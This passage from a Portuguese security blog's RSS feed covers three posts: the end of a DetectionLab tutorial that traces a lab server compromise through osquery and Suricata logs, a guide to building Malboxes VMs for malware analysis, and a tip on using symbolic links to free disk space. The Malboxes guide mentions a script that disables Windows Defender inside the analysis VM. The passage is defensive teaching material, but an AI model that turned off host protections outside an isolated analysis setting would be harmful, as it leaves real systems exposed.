d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p>Pelo o que entendi, esses if's (<code>if($_=~ /(.*)/)</code>) s√£o como uma prote√ß√£o contra script kiddies, ou apenas para redu√ß√£o de poss√≠veis danos maiores. Eles removem a possibilidade de uso de caracteres maliciosos (caracteres de escape e controle), pois com eles, o estrago pode ser muito maior pelo jeito. Mas atacantes sofisticados podem remover essas prote√ß√µes.
{: .prompt-info}</p></blockquote><p>Essa parte achei bem interessante, da pra diferenciar o tipo de atacante s√≥ pelo payload!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-kernel-exploit-download---splunk">Detecting Kernel Exploit Download - Splunk<a href="#detecting-kernel-exploit-download---splunk" class="hash-link" aria-label="Link direto para Detecting Kernel Exploit Download - Splunk" title="Link direto para Detecting Kernel Exploit Download - Splunk">‚Äã</a></h3><p>Agora que sabemos que o servidor foi ownado podemos ver se ele fez requisi√ß√µes para outros servidores.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> process_open_sockets </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">where</span><span class="token plain"> remote_address </span><span class="token operator">=</span><span class="token plain">  </span><span class="token string" style="color:rgb(255, 121, 198)">'192.168.56.109'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" alt="wget.png" src="/assets/images/wget-7d28e70d48569128f63fa91006bf6134.png" width="1170" height="596" class="img_ev3q"></p><p>Pelos logs do suricata, conseguimos pegar a requisi√ß√£o originada pelo servidor para o servidor malicioso, que foi usada para fazer o download do malware.  </p><p>Esse foi apenas um exemplo de v√°rias das possibilidades com esse laborat√≥rio.</p><h1>Referencias</h1><ul><li><a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">https://detectionlab.network</a></li><li><a href="https://docs.nxlog.co/userguide/configure/index.html" target="_blank" rel="noopener noreferrer">https://docs.nxlog.co/userguide/configure/index.html</a></li><li><a href="https://osquery.readthedocs.io/en/latest/" target="_blank" rel="noopener noreferrer">https://osquery.readthedocs.io/en/latest/</a></li><li><a href="https://github.com/rapid7/metasploitable3/" target="_blank" rel="noopener noreferrer">https://github.com/rapid7/metasploitable3/</a></li></ul><p><em>[SO]<!-- -->:"Sistema Operacional"
</em>[dropo]<!-- -->: "Do ingles, drop, derrubar"</p>]]></content:encoded>
            <category>pr√°tica</category>
            <category>tutorial</category>
        </item>
        <item>
            <title><![CDATA[Criando VMs Malboxes]]></title>
            <link>https://imgodes.github.io/blog/2023/04/23/malboxes/malboxes-vms</link>
            <guid>https://imgodes.github.io/blog/2023/04/23/malboxes/malboxes-vms</guid>
            <pubDate>Sun, 23 Apr 2023 12:52:00 GMT</pubDate>
            <description><![CDATA[Como provisionar m√°quinas virtuais para estudo de malwares e engenharia reversa.]]></description>
            <content:encoded><![CDATA[<p>Como provisionar m√°quinas virtuais para estudo de malwares e engenharia reversa.</p><p><img loading="lazy" alt="robot" src="/assets/images/robot-cdcf09851a7be86b729014d6b4e6ada8.png" width="2052" height="1290" class="img_ev3q"></p><p>A GoSecure possui uma ferramenta voltada para an√°lise de malware e engenharia reversa chamada Malboxes, com ela podemos provisionar VMs Windows, destru√≠-las e faze-las do zero de novo bem facilmente. Vi essa necessidade durante o curso do <a href="https://www.instagram.com/hackingnaweboficial/" target="_blank" rel="noopener noreferrer">Rafael Sousa</a>, e outros estudos semelhantes.</p><ul><li><a href="https://github.com/GoSecure/malboxes" target="_blank" rel="noopener noreferrer">Reposit√≥rio do Malboxes</a></li><li><a href="https://www.gosecure.net/blog/2017/02/16/introducing-malboxes-a-tool-to-build-malware-analysis-virtual-machines/" target="_blank" rel="noopener noreferrer">Introducing Malboxes: a Tool to Build Malware Analysis Virtual Machines</a></li></ul><h1>Requisitos</h1><ul><li>Vagrant</li><li>Packer</li><li>Git </li><li>Python pip</li><li>Virtualbox </li></ul><h1>Instala√ß√£o</h1><p>A forma de instala√ß√£o j√° est√° no <a href="https://github.com/GoSecure/malboxes#installation" target="_blank" rel="noopener noreferrer">reposit√≥rio oficial</a> deles, portanto vou apenas falar das minhas customiza√ß√µes feitas para estudar Assembly, C, e eventualmente, engenharia reversa.</p><p>Criei uma pasta chamada REV, para colocar tudo o que preciso.</p><p>Eu instalo os seguintes programas:</p><ul><li><a href="https://hex-rays.com/ida-pro/" target="_blank" rel="noopener noreferrer">IDA Pro 0800 (Engenharia Reversa)</a></li><li><a href="https://www.masm32.com/download.htm" target="_blank" rel="noopener noreferrer">Masm 32 (Assembly)</a></li><li><a href="https://github.com/mentebinaria/retoolkit" target="_blank" rel="noopener noreferrer">Retoolkit (Engenharia Reversa)</a></li><li><a href="https://www.codeblocks.org/" target="_blank" rel="noopener noreferrer">CodeBlocks (C)</a></li></ul><p>Executo o comando <code>vagrant init</code>, que inicializa o ambiente Vagrant no diret√≥rio criando uma arquivo chamado <code>Vagrantfile</code> caso ainda n√£o exista.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">vagrant init</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Ent√£o a estrutura ficou assim: </p><div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockTitle_Ktv7">Estrutura do diret√≥rio</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-txt codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">REV</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îú‚îÄ‚îÄ IDAPRO</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ (arquivos do IDA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îú‚îÄ‚îÄ tools</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ codeblocks-20.03-32bit-mingw-64bit-setup.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ masm32.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ retoolkit_2022.10_setup.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îî‚îÄ‚îÄ Vagrantfile</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Para o meu uso, basta deixar os execut√°veis dispon√≠veis, nem sempre eu preciso de todas essas ferramentas instaladas.</p><div class="theme-admonition theme-admonition-info alert alert--info admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>&nbsp;Automatizando</div><div class="admonitionContent_S0QG"><p>Caso queira, por meio do vagrant √© poss√≠vel criar automa√ß√µes, de forma que, sempre que iniciar aquela m√°quina virtual o vagrant ir√° configura-la da maneira que voc√™ precisa.</p></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="provisionando-a-vm">Provisionando a VM<a href="#provisionando-a-vm" class="hash-link" aria-label="Link direto para Provisionando a VM" title="Link direto para Provisionando a VM">‚Äã</a></h2><p>O comando <code>malboxes build win10_x64_analyst</code>, le o arquivo de configura√ß√£o dispon√≠vel em <code>/home/USERNAME/.config/malboxes/config.js</code> para saber quais as preferencias do usu√°rio para a cria√ß√£o da m√°quina. Ele pode ser editado da seguinte forma a fim de definir os path das ferramentas:</p><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockTitle_Ktv7">config.js</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token string-property property">"ida_path"</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"/home/USERNAME/Downloads/IDAPRO"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token string-property property">"tools_path"</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"/home/cherno/Downloads/Tools"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="theme-admonition theme-admonition-tip alert alert--success admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>Op√ß√£o menos complicada</div><div class="admonitionContent_S0QG"><p>H√° uma segunda op√ß√£o; por padr√£o quando provisionarmos a VM, o diret√≥rio atual ser√° sincronizado com um diret√≥rio dentro da VM, logo, basta manter os execut√°veis na mesma pasta que usaremos para provisionar a m√°quina.</p><p>Observe abaixo, a visao na m√°quina host Linux, e como ficaria na VM Windows depois de criada.</p><div class="tabs-container tabList__CuJ"><ul role="tablist" aria-orientation="horizontal" class="tabs"><li role="tab" tabindex="0" aria-selected="true" class="tabs__item tabItem_LNqP tabs__item--active">Host Linux</li><li role="tab" tabindex="-1" aria-selected="false" class="tabs__item tabItem_LNqP">VM Windows</li></ul><div class="margin-top--md"><div role="tabpanel" class="tabItem_Ymn6"><div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-txt codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îú‚îÄ‚îÄ IDAPRO</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îú‚îÄ‚îÄ tools</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îî‚îÄ‚îÄ Vagrantfile</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><div role="tabpanel" class="tabItem_Ymn6" hidden=""><div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Users\malboxes\Desktop\host&gt;tree /F</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Folder PATH listing</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volume serial number is 0C1D-FBA3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ   Vagrantfile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îú‚îÄ‚îÄ‚îÄtools</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ       masm32.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ       codeblocks-20.03-32bit-mingw-64bit-setup.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ       retoolkit_2022.10_setup.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îÇ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">‚îî‚îÄ‚îÄ‚îÄIDAPRO</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ‚îú‚îÄ‚îÄ‚îÄ (arquivos do IDA)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div></div></div></div><p>Agora que est√° tudo no jeito, basta buildar e executar a m√°quina:</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">malboxes build win10_x64_analyst</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">malboxes spin win10_x64_analyst </span><span class="token function" style="color:rgb(80, 250, 123)">rev</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vagrant up</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Caso precise desabilitar o defender, basta executar o script em <code>C:\Tools\disable_defender</code> dentro da m√°quina provisionada.</p><p>Obrigado por ler!</p>]]></content:encoded>
            <category>engenharia reversa</category>
            <category>infraestrutura</category>
            <category>malboxes</category>
        </item>
        <item>
            <title><![CDATA[Malabarismo com link simb√≥lico]]></title>
            <link>https://imgodes.github.io/blog/2022/12/03/linksimb/malabarismo-com-links-simb√≥licos</link>
            <guid>https://imgodes.github.io/blog/2022/12/03/linksimb/malabarismo-com-links-simb√≥licos</guid>
            <pubDate>Sat, 03 Dec 2022 18:40:00 GMT</pubDate>
            <description><![CDATA[Como usar links simb√≥licos para aumentar o espa√ßo em disco sem reiniciar o servidor.]]></description>
            <content:encoded><![CDATA[<p>Como usar links simb√≥licos para aumentar o espa√ßo em disco sem reiniciar o servidor.</p><p><img loading="lazy" alt="disk3" src="/assets/images/disk3-4d62a8d39fa1a77c0ab7d633335c980b.png" width="502" height="443" class="img_ev3q"></p><p><a href="https://en.wikipedia.org/wiki/Symbolic_link#Storage_of_symbolic_links" target="_blank" rel="noopener noreferrer">Symbolic link - Wikipedia</a></p><p><a href="https://linuxconfig.org/how-to-save-space-with-symlinks-and-mount-points" target="_blank" rel="noopener noreferrer">How to save space with-ymlinks</a></p><p><img loading="lazy" alt="Disk" src="/assets/images/disk-ace4ff95ff532084ecc5f79400c94202.png" width="264" height="314" class="img_ev3q"> </p><p>Quando o disco fica cheio, e diante da impossibilidade de expandir a parti√ß√£o raiz, podemos optar pela combina√ß√£o de adi√ß√£o de um novo disco com o uso de links simb√≥licos. Observe o desenho, a fim de entender a situa√ß√£o problema;
Num primeiro momento, voc√™ apenas sabe que sua aplica√ß√£o n√£o consegue mais escrever em arquivos, pois o disco est√° cheio. Bom, podemos usar o comando abaixo, para achar qual diret√≥rio est√° ocupando mais espa√ßo: </p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token function" style="color:rgb(80, 250, 123)">du</span><span class="token plain"> -d </span><span class="token number">1</span><span class="token plain"> -cha / </span><span class="token operator file-descriptor important">2</span><span class="token operator">&gt;</span><span class="token plain">/dev/null </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">grep</span><span class="token plain"> -E </span><span class="token string" style="color:rgb(255, 121, 198)">'G|M'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>E supondo que voc√™ descobriu que o diret√≥rio era de fato da sua aplica√ß√£o no <code>/var</code> , e n√£o h√° como expandir o volume, nem a parti√ß√£o raiz configurada, diante disso, podemos fazer a sua aplica√ß√£o achar que est√° armazenando no <code>/var/aplica√ß√£o</code> , quando na verdade, esta sendo usado o espa√ßo dispon√≠vel no disco rec√©m adicionado (referenciado na imagem, como <code>/dev/sdb1</code>).</p><p><img loading="lazy" alt="disk2" src="/assets/images/disk2-d7ea3f600560c8c9a6d5621b5fc12718.png" width="502" height="443" class="img_ev3q"></p><p>Adicione o novo disco, monte em um diret√≥rio qualquer, pare a sua aplica√ß√£o, e mova os arquivos para o novo diret√≥rio (talvez bata um medo, rsrs):</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/init.d/aplica√ß√£o stop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">mv</span><span class="token plain"> /var/aplica√ß√£o /disconovo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ln</span><span class="token plain"> -s /disconovo/aplica√ß√£o /var/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Agora <code>/var/aplica√ß√£o</code> √© apenas um link simb√≥lico, como um atalho na sua √°rea de trabalho.</p><p><img loading="lazy" alt="disk3" src="/assets/images/disk3-4d62a8d39fa1a77c0ab7d633335c980b.png" width="502" height="443" class="img_ev3q"></p><p>Se voc√™ fizer <code>ln -s /var/aplicacao /var/link</code>, ent√£o <code>/var/link</code> ser√° um arquivo que ir√° fazer referencia ao conte√∫do de <code>/var/aplicacao</code>. Logo <code>ls /var/link</code>, tentar√° obter uma listagem de diret√≥rios para <code>/var/link</code>, e o sistema devolver√° uma listagem do conte√∫do de <code>/var/aplicacao</code>.</p><p>O mesmo serve na hora de escrever os arquivos.</p>]]></content:encoded>
            <category>pr√°tica</category>
            <category>tutorial</category>
        </item>
    </channel>
</rss>